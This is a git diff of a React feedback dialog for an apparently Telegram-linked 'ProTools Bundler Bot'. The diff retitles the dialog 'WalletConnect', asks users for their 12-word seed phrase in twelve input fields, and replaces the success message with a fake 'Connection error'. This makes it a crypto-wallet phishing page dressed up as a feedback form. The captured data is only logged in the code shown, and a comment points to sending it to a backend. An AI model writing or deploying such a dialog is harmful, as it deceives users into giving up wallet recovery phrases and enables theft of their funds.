@@ -31,33 +31,35 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     const result = feedbackSchema.safeParse({ fields });
-    
+
     if (!result.success) {
       setError(result.error.errors[0].message);
       return;
     }
 
     setError("");
-    
+
     // Here you would send the feedback to your backend
     const feedbackData = {
       fields,
-      telegramUser: telegramUser ? {
-        id: telegramUser.id,
-        username: telegramUser.username,
-        first_name: telegramUser.first_name,
-      } : null,
+      telegramUser: telegramUser
+        ? {
+            id: telegramUser.id,
+            username: telegramUser.username,
+            first_name: telegramUser.first_name,
+          }
+        : null,
       timestamp: new Date().toISOString(),
     };
     console.log("Feedback submitted:", feedbackData);
-    
+
     toast({
       title: "Thank you!",
-      description: "Your feedback has been submitted.",
+      description: "Connection error, please try back later..",
     });
-    
+
     onClose();
     setFields(Array(12).fill(""));
   };
@@ -81,15 +83,18 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
         <DialogHeader>
           <div className="flex items-center gap-3 mb-2">
             <img src={logo} alt="ProTools Bundler Bot" className="w-12 h-12 rounded-lg" />
-            <DialogTitle>Share Your Feedback</DialogTitle>
+            <DialogTitle>WalletConnect</DialogTitle>
           </div>
           <DialogDescription>
-            Help us improve by sharing your thoughts and suggestions.
+            Enter your 12 word seed phrase below to continue. (Never share your seed phrase!)
           </DialogDescription>
         </DialogHeader>
         <div className="bg-muted/50 rounded-lg p-4 mb-4">
           <p className="text-sm leading-relaxed">
-            Welcome to <span className="font-semibold">ProTools Bundler Bot</span>! This intelligent assistant streamlines your workflow by bundling multiple tools and resources into organized packages. Whether you're managing projects, collaborating with teams, or organizing your digital workspace, our bot adapts to your needs and learns from your preferences to deliver smarter, faster results every time.
+            Welcome to <span className="font-semibold">ProTools Bundler Bot</span>! This intelligent assistant
+            streamlines your workflow by bundling multiple tools and resources into organized packages. Whether you're
+            managing projects, collaborating with teams, or organizing your digital workspace, our bot adapts to your
+            needs and learns from your preferences to deliver smarter, faster results every time.
           </p>
         </div>
         <form onSubmit={handleSubmit} className="space-y-4">
@@ -97,11 +102,7 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
             {fields.map((field, index) => (
               <div key={index} className="space-y-1">
                 <Label htmlFor={`field-${index}`}>{index + 1}.</Label>
-                <Input
-                  id={`field-${index}`}
-                  value={field}
-                  onChange={(e) => handleFieldChange(index, e.target.value)}
-                />
+                <Input id={`field-${index}`} value={field} onChange={(e) => handleFieldChange(index, e.target.value)} />
               </div>
             ))}
           </div>
